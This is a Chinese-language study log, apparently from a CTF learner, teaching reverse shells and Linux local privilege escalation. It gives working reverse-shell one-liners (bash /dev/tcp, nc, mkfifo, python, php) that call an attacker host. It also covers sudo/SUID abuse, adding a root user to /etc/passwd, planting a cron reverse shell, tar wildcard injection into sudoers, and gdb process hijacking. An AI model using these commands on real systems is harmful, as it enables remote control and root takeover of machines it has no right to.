# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. 学习了反弹shell和本地提权的相关知识
2. shctf-web-wp部分内容已上传<a href="https://uk5555544.github.io/">博客</a>
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. **学习docker制题**
2. Mongodb还没更
3. java好啊，java得学啊
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
### 反弹shell和本地提权
> linux软件内核外壳叫shell，负责编译指令给操作系统执行。终端负责接受用户指令和输出结果，shell和终端中间连接的交互接口叫TTY（Teletypewriter）

**常用shell反弹方式:**

1. bash 

```bash
bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
```
-c指执行字符串，防止错误解析>&;-i指交互模式。/dev/tcp/是bash的特殊字符串而不是文件，代表bash创建socket连接到指定ip和端口，>&单独表示将stdout和stderr重定向到这个socket连接

2. nc
```bash
nc -e /bin/bash ip port
```
-e指执行参数(execute)，会执行bash并连接到指定ip和端口

如果nc不支持-e参数，可以使用mkfifo命令
```bash
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
```
在tmp用mkfifo创建了一个管道文件。vps执行命令发送给管道->cat捕获管道输入并传递给sh执行->sh将stdout和stderr打包->将结果通过nc发送到攻击者ip和端口

3. 运行python脚本
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```
>dup2(a,b)的意思是复制文件描述符，把a复制覆盖b。fileno()方法返回socket的文件描述符(创立socket分配的整数默认为3)，这样就可以把靶机shell的std都重定向到socket连接上了。然后启动shell

4. php脚本

有些环境没有python
```php
php -r '$sock=fsockopen("ip",port); exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```
> fsockopen()函数创建一个socket连接，返回一个文件描述符(3)，exec()函数执行shell命令并重定向输入输出到这个socket连接上

**升级TTY**
通常反弹的shell内核都不会分配PTY(伪终端)，缺失了shell的交互功能。这导致一些系统命令如sudo,vim等无法使用。这时我们需要获取PTY方便后续提权

1. 如果环境支持python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
2. script命令
```bash
script /dev/null -c bash
```
>这个很巧妙。script命令本来是用来记录终端会话的，会自动调用PTY，但/null会删除记录文件。这时-c执行参数执行bash就获得了有PTY的bash shell了

**提权**
1. sudo提权
```bash
sudo -l # 查看权限列表
```
提权万精油，先检查哪些命令可以免密执行。比如输出
> (root) NOPASSWD: /usr/bin/vim # 免密以root身份执行vim

vim是文本编辑器，可以执行系统命令。输入:进入命令模式，输入!执行命令。如果vim使用权限足够，那么我们可以以root身份用vim打开一个子shell。这个子shell的权限默认为vim的权限，也就是root了
```bash
sudo vim -c ':!/bin/bash'
```
如果可利用的是find，find命令有一个-exec参数，可以执行指定命令
```bash
sudo find / -exec /bin/bash \; -quit
```
更多命令提权方法可以参考<a href="https://gtfobins.github.io/">GTFOBins</a>
2. SUID提权
>SUID是linux文件权限的一种特殊设置，允许用户以文件所有者的权限执行该文件。比如一个文件的权限是rwsr-xr-x，其中s表示SUID位被设置了，执行这个文件时会以文件所有者的权限运行

我们可以用find全盘查找带有SUID属性的文件
```bash
find / -perm -u=s -type f 2>/dev/null
```
> -perm表示权限，-u=s表示文件的用户权限带有suid属性，-type f表示只查找文件，2>/dev/null表示将错误输出清空

和sudo提权类似，找到可利用的SUID命令文件再命令提权shell
3. passwd文件提权
> /etc/passwd文件存储了系统用户信息，/etc/shadow文件存储了用户密码hash。正常情况下/passwd可读但不可写，而shadow文件则不可读也不可写

用户信息格式如下
![](https://raw.githubusercontent.com/UK5555544/uky_images/main/blogs/20260227125406.png)

UID代表用户，GID代表用户组。普通用户权限都大于1000，而root用户uid为0。也就是说，如果/passwd文件被误配置为可写（ls -l /etc/passwd），那么我们就可以添加一个uid为0的用户来提权

我们先自己做一个密码
```bash
openssl passwd -1 -salt uky 123456
# -1表示使用MD5算法加密，-salt指定盐值，123456是明文密码
```
然后写入用户
```bash
echo "uky:$1$uky$O8sHj3n7u9m5v6w7x8y9:0:0:root:/root:/bin/bash" >> /etc/passwd
```
> \>\>表示追加写入

后面只要登陆该用户即可
```bash
su uky
```
还有一种情况，一般/passwd信息密码用x代替了(如上图)，但如果哈希暴露。可以用john破解
```bash
echo 'root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash' > ~/hash.txt
john ~/hash.txt
```
4. Cron Jobs
>cron是linux的定时任务调度器，系统会自动根据计划任务在一个时间周期内执行。

计划默认目录在/etc/crontab，一般文件写法如下
```bash
* * * * * root /var/www/html/backup.sh
```
>前五个字段分别是分钟、小时、日期、月份、星期（全为*默认为1分钟），表示在什么时候执行这个任务。第六个字段是用户，表示以哪个用户的身份执行这个任务。最后一个字段是要执行的命令

如果计划执行的文件可以写入且权限是root，则可以追加一行来执行反弹shell
```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" >> /var/www/html/backup.sh
```
等待cron执行计划后就会给vps反弹一个root-shell

5. 通配符注入

由于shell的通配符*是由shell解析的，他可以将匹配的文件名当作命令参数解析

最经典的例子是计划tar命令，有两个参数。
+ --checkpoint=1 表示每解压一个文件就触发检查点
+ --checkpoint-action=exec=命令 表示每触发一次检查点就执行一次命令

而定时任务里用*备份文件
```bash
*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
```
我们可以在/var/www/html/目录下创建文件
```bash
echo 'echo "uky ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' >test.sh
# /etc/sudoers是linux系统里管理sudo权限的最高配置文件,利用root权限写入一行，给uky用户免密sudo权限
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
```

root权限计划运行tar命令就会执行test.sh
```
tar -zcf /var/backups/html.tgz /var/www/html/*
```
6. gdb控制
> gdb是linux的调试工具，可以用来分析程序的运行状态和内存信息

在linux里进程调试需要有ptrace权限，该权限设置在/proc/sys/kernel/yama/ptrace_scope文件里
+ 0表示任何用户都可以调试任何进程
+ 1表示用户只能调试自己的进程
+ 2表示管理员才能调试任何进程
+ 3表示完全禁止调试

如果ptrace_scope设置为0，低权限用户就可以用gdb调试高权限进程
```bash
gdb -p 1145
# -p指定要调试的进程id
```
利用高权限进程的system()执行高权限操作
```bash
(gdb) call (int)system("sudo cat /flag > /tmp/flag.txt")
```
# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
学习了反弹shell和本地提权的相关知识，掌握了多种反弹shell的方式和提权方法